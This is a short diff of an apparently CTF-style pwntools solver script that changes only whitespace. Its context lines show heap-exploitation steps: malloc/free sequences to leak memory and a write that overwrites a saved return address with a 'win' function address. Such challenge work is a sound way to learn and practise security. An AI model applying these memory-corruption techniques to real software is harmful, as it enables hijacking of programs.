@@ -41,7 +41,7 @@ def one_round(io: pwn.process):
     tee(io)
 
     def leak_memory(offset):
-        malloc_size = 0x20 # malloc size in 'echo'
+        malloc_size = 0x20  # malloc size in 'echo'
         io.sendline(b"malloc 0 %d" % malloc_size)
         io.sendline(b"malloc 1 %d" % malloc_size)
         io.sendline(b"free 1")
@@ -89,6 +89,7 @@ def one_round(io: pwn.process):
     write_qword(ret_addr, win_addr)
     io.sendline(b"quit")
     io.recvrepeat()
+
 
 def ctf():
     root_bin = find_challenge()
